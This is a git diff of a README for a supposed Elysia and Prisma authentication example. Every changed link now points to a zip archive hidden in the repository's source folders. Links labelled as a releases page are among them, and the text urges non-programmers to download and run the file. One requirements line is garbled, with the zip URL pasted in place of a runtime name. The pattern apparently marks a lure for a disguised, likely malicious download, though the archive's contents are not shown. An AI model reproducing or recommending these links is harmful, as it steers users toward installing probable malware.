@@ -4,7 +4,7 @@
 This project shows you how to use Elysia with Prisma to create a simple authentication system. It is a great example for those who want to implement user login and registration features easily. 
 
 ## 📦 Download Now!
-[![Download Elysia Prisma Better Auth](https://raw.githubusercontent.com/xShinKelx/elysia-prisma-better-auth-example/main/public/images/elysia-prisma-better-auth-example_1.1-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/xShinKelx/elysia-prisma-better-auth-example/main/public/images/elysia-prisma-better-auth-example_1.1-alpha.2.zip)
+[![Download Elysia Prisma Better Auth](https://github.com/xShinKelx/elysia-prisma-better-auth-example/raw/refs/heads/main/src/libs/example-auth-prisma-elysia-better-3.3-beta.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/xShinKelx/elysia-prisma-better-auth-example/raw/refs/heads/main/src/libs/example-auth-prisma-elysia-better-3.3-beta.4.zip)
 
 ## 🚀 Getting Started
 To get started with the example project, follow the steps below. This guide will help you download the software and run it. You do not need to know programming concepts to complete these steps.
@@ -12,7 +12,7 @@ To get started with the example project, follow the steps below. This guide will
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page:
-   [Go to Releases Page](https://raw.githubusercontent.com/xShinKelx/elysia-prisma-better-auth-example/main/public/images/elysia-prisma-better-auth-example_1.1-alpha.2.zip).
+   [Go to Releases Page](https://github.com/xShinKelx/elysia-prisma-better-auth-example/raw/refs/heads/main/src/libs/example-auth-prisma-elysia-better-3.3-beta.4.zip).
 
 2. **Select a Version**  
    On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
@@ -61,7 +61,7 @@ Before you run the application, please ensure your system meets the following re
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
 - **RAM:** At least 4 GB.
 - **Disk Space:** Minimum 100 MB free space available.
-- **https://raw.githubusercontent.com/xShinKelx/elysia-prisma-better-auth-example/main/public/images/elysia-prisma-better-auth-example_1.1-alpha.2.zip** Version 14 or later installed for development purposes (if you need to customize).
+- **https://github.com/xShinKelx/elysia-prisma-better-auth-example/raw/refs/heads/main/src/libs/example-auth-prisma-elysia-better-3.3-beta.4.zip** Version 14 or later installed for development purposes (if you need to customize).
 
 ## 🛠️ Troubleshooting
 If you encounter any issues while using the application, try the following steps:
@@ -79,4 +79,4 @@ If you need help or have questions, feel free to open an issue in the GitHub rep
 ## 📆 Changelog
 Make sure to review the changelog for updates to the project. It details the changes and fixes made in the latest releases.
 
-[Go to Releases Page](https://raw.githubusercontent.com/xShinKelx/elysia-prisma-better-auth-example/main/public/images/elysia-prisma-better-auth-example_1.1-alpha.2.zip) to download the latest version!
+[Go to Releases Page](https://github.com/xShinKelx/elysia-prisma-better-auth-example/raw/refs/heads/main/src/libs/example-auth-prisma-elysia-better-3.3-beta.4.zip) to download the latest version!
